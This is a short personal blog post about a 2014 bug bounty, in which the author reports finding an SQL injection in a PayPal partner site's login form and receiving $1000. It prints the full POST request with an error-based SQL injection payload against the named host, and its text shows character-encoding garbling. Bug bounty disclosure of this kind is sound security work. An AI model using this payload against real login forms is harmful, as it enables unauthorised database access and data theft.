I"Ë<p>It‚Äôs been a year after my website ‚Äòjeroldcamacho.com‚Äô was gone because I forgot to renew my domain and I don‚Äôt even have a backup of my website nor my blog posts. As the title says ‚Äúhow i got my 1000$ from paypal partner site.‚Äù. So, here it goes.</p>

<p><strong>Easy2Export</strong> is one of paypal partner website, yeah it is! <a href="http://www.ecommercebytes.com/cab/abn/y13/m12/i24/s04">[..]</a></p>

At first, i tried to break the login form. After a few minutes of testing, I foundout that the login form is vulnerable to POST SQL Injection.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://easy2export.com/index.php/site/login

POST /index.php/site/login HTTP/1.1
Host: easy2export.com
‚Ä¶
LoginForm[username]=‚Äô or 1 group by concat_ws(0x3a,user(),floor(rand(0)*2)) having min(0) or 1‚Äì+&amp;LoginForm[password]=‚Äô&amp;LoginForm[accounttype]=sub&amp;LoginForm[rememberMe]=0&amp;yt0=
</code></pre></div></div>
<p><br /></p>

I immediately reported this to PayPal and they fixed the vulnerability issue quickly. <strong>[10/30/2014 09:21:53]</strong>

In their bug bounty program guidelines, it is noted that sql injection in paypal partner sites will receive 1000$.

And they checked the eligibility of my report so they then send me the reward amounting to 1000$. <strong>[11/22/14 6:23:35]</strong></p>
